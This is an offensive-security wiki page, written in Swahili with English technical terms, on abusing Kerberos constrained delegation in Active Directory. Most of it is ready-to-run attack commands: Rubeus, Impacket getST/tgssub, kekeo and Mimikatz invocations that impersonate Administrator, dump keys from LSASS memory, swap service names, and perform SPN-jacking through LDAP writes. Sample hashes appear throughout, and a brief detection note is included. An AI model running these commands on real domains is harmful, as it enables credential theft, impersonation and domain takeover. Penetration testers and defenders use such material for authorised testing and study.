# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Kwa kutumia hii, Domain admin anaweza **kuruhusu** computer **kuiga utambulisho wa user au computer** dhidi ya **service** yoyote ya mashine.

- **Service for User to self (_S4U2self_):** Kwa kawaida, **service account yoyote inayomiliki SPN** inaweza kupata TGS ya yenyewe kwa niaba ya user yeyote. Ikiwa account hiyo pia ina [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) katika _userAccountControl_, TGS hiyo huwa **forwardable**, jambo linalofanya protocol transition iwe na manufaa moja kwa moja kwa **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **Service account** inaweza kupata TGS kwa niaba ya user kwa SPNs zilizoorodheshwa katika **msDS-AllowedToDelegateTo**. Evidence ticket inayotumiwa katika S4U2Proxy lazima iwe ticket **forwardable** kuelekea service inayofanya delegation: ama ticket halisi ya client-to-service iliyokamatwa kutoka kwa victim, au iliyotengenezwa kwa **S4U2Self + T2A4D**.

**Note**: Ikiwa user amewekewa alama ya ‘_Account is sensitive and cannot be delegated_’ katika AD, au ni mwanachama wa **Protected Users**, kwa kawaida **hutaweza kuiga utambulisho** wake kupitia constrained delegation. Katika domains za kisasa, tumia material ya **AES** badala ya kudhani RC4 pekee unapolenga accounts zilizowezeshwa kwa delegation.

Hii inamaanisha kuwa ukifanikiwa **ku-compromise hash ya service**, unaweza **kuiga utambulisho wa users** na kupata **access** kwa niaba yao kwenye **service** yoyote kupitia mashine zilizoonyeshwa (inawezekana kufanya **privesc**).

Zaidi ya hayo, **hutakuwa na access tu kwa service ambayo user anaweza kuiga utambulisho wake, bali pia kwa service yoyote**, kwa sababu SPN (jina la service lililoombwa) haikaguliwi (katika ticket, sehemu hii haijasimbwa kwa njia ya encryption wala kutiwa saini). Kwa hiyo, ikiwa una access kwa **CIFS service**, unaweza pia kupata access kwa **HOST service** ukitumia flag ya `/altservice` katika Rubeus, kwa mfano. Udhaifu huo huo wa kubadilisha SPN hutumiwa vibaya na **Impacket getST -altservice** pamoja na tooling nyingine.

Pia, **access ya LDAP service kwenye DC** ndiyo inayohitajika kutumia **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Dokezo la operator:** usitegemee screenshots za **ADUC** au BloodHound pekee kwa ukaguzi wa **gMSA/sMSA**. Akaunti hizo mara nyingi huficha kichupo cha kawaida cha Delegation, hivyo orodhesha moja kwa moja attributes ghafi za **`userAccountControl`** na **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition dhidi ya Kerberos-only constrained delegation

Ikiwa account iliyoathirika ina **T2A4D**, kwa kawaida unaweza kukamilisha chain kamili ya **`S4U2Self -> S4U2Proxy`** kwa kutumia service key/TGT pekee.<sup>[[2]](#references)</sup>

Ikiwa ina **`msDS-AllowedToDelegateTo`** pekee (mode ya kawaida ya **"Use Kerberos only"**), delegation bado inaweza kutumiwa vibaya, lakini evidence ticket ya S4U2Proxy lazima iwe **real forwardable user-to-service ticket** ya delegating service. Kwa vitendo, hii inamaanisha kuiba au kunasa victim TGS kutoka **LSASS/ccache** na kuiingiza kwenye hatua ya pili (`/tgs:` katika Rubeus). **Non-forwardable** S4U2Self ticket **haitoshi** kwa classic constrained delegation; ikiwa hiyo ndiyo evidence ticket yako pekee, angalia [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) badala yake.<sup>[[2]](#references)</sup>

### Maelezo ya cross-domain constrained delegation (2025+)

Tangu **Windows Server 2012/2012 R2**, KDC inasaidia **constrained delegation across domains/forests** kupitia S4U2Proxy extensions. Modern builds (Windows Server 2016–2025) zinaendelea na tabia hii na kuongeza PAC SIDs mbili kuashiria protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wakati user ali-authenticate kwa kawaida.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wakati service ilithibitisha identity kupitia protocol transition.

Tarajia `SERVICE_ASSERTED_IDENTITY` ndani ya PAC wakati protocol transition inatumika across domains, ikithibitisha kuwa hatua ya S4U2Proxy ilifanikiwa.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Impacket ya hivi karibuni (0.11.x+) inaonyesha S4U chain na SPN swapping sawa na Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Ikiwa unapendelea kuforge user ST kwanza (kwa mfano, ukiwa na offline hash pekee), tumia **ticketer.py** pamoja na **getST.py** kwa S4U2Proxy. `tgssub.py` pia ni muhimu unapokuwa tayari una ccache inayofanya kazi na unahitaji tu kubadilisha service class kwa host ileile. Angalia Impacket issue #1713 kwa quirks za sasa (KRB_AP_ERR_MODIFIED wakati forged ST hailingani na SPN key).<sup>[[2]](#references)</sup>

### SPN-jacking: kuelekeza target ya constrained-delegation

Classic constrained delegation hu-authorize **SPN string** katika `msDS-AllowedToDelegateTo`, si target SID isiyoweza kubadilishwa. Wakati wa S4U2Proxy, KDC hutafuta akaunti inayomiliki SPN hiyo kwa sasa na ku-encrypt service ticket kwa long-term key ya akaunti hiyo. Kwa hiyo, kuidhibiti akaunti ya delegating pamoja na `WriteSPN` juu ya akaunti nyingine ya service/computer kunaweza kuelekeza upya delegation constraint ambayo haijabadilishwa bila `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Kuna variants mbili:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** SPN iliyoruhusiwa ni orphaned kwa sababu owner wake wa awali alifutwa, alipewa jina jipya, au SPN iliondolewa. Iongeze moja kwa moja kwenye target account inayotakiwa.
- **Live SPN-jacking:** SPN bado ni ya source account. Duplicate-SPN validation kwa kawaida huzuia destination write, hivyo `WriteSPN` inahitajika kwenye objects zote mbili: iondoe kwenye source, iongeze kwenye target, pata ticket, kisha restore registration ya awali.

Linux flow ifuatayo iliyofupishwa huhamisha SPN iliyoruhusiwa, huendesha S4U kama compromised delegating principal, na huandika upya service name ya ticket kuwa service muhimu kwenye target mpya.<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice` ni primitive ya pili, tofauti. Tiketi ya S4U2Proxy ilisimbwa kwa akaunti ambayo sasa inamiliki `$DELEGATED_SPN`; kwa sababu jina la huduma ya tiketi (`sname`) liko nje ya sehemu ya mwili wa tiketi iliyosimbwa, tooling inaweza kubadilisha service class/hostname kwa nyingine ambayo huduma yake inatumia key hiyo hiyo ya akaunti. SPN-jacking hubadilisha kwanza **ni key ipi ya akaunti** inayolinda tiketi, huku ubadilishaji wa service class ukibadilisha **tiketi hiyo inawasilishwa wapi**.<sup>[[5]](#references)[[6]](#references)</sup>

Kwa live jacking, rudisha LDAP writes hizo mbili mara tu baada ya kupata tiketi ili kuepuka kuharibu huduma halali. Kwenye DCs zilizo na computer-account auditing, tafuta Security event **4742** ambapo `servicePrincipalName` imeondolewa kwenye computer moja na kuongezwa muda mfupi baadaye kwenye nyingine, hasa wakati SPN hostname inatofautiana na `dNSHostName` ya destination. Correlate na event **4769**: S4U2Self huwasilisha akaunti hiyo hiyo kama client/service, huku S4U2Proxy ikiweka **Transited Services**.<sup>[[5]](#references)</sup>

### Ku-automate usanidi wa delegation kwa low-priv creds

Ikiwa tayari una **GenericAll/WriteDACL** juu ya computer au service account, unaweza kusukuma attributes zinazohitajika remotely bila RSAT ukitumia **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Hii hukuruhusu kuunda njia ya constrained delegation kwa ajili ya privesc bila privileges za DA mara tu unapoweza kuandika attributes hizo.

- Step 1: **Pata TGT ya allowed service**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Kuna **njia nyingine za kupata tiketi ya TGT** au **RC4** au **AES256** bila kuwa SYSTEM kwenye computer, kama vile Printer Bug na unconstrained delegation, NTLM relaying na Active Directory Certificate Service abuse
>
> **Kuwa tu na tiketi hiyo ya TGT (au hash yake) kunakuwezesha kutekeleza attack hii bila ku-compromise computer nzima.**

- Hatua ya 2: **Pata TGS ya service huku ukijifanya mtumiaji**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Maelezo zaidi katika ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) na [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Muhtasari wa Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Kutumia Vibaya Delegation kwa Impacket (Sehemu ya 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Iliua Domain: Muhtasari wa Offensive Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: Kisa cha Kipekee katika WriteSPN Abuse](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
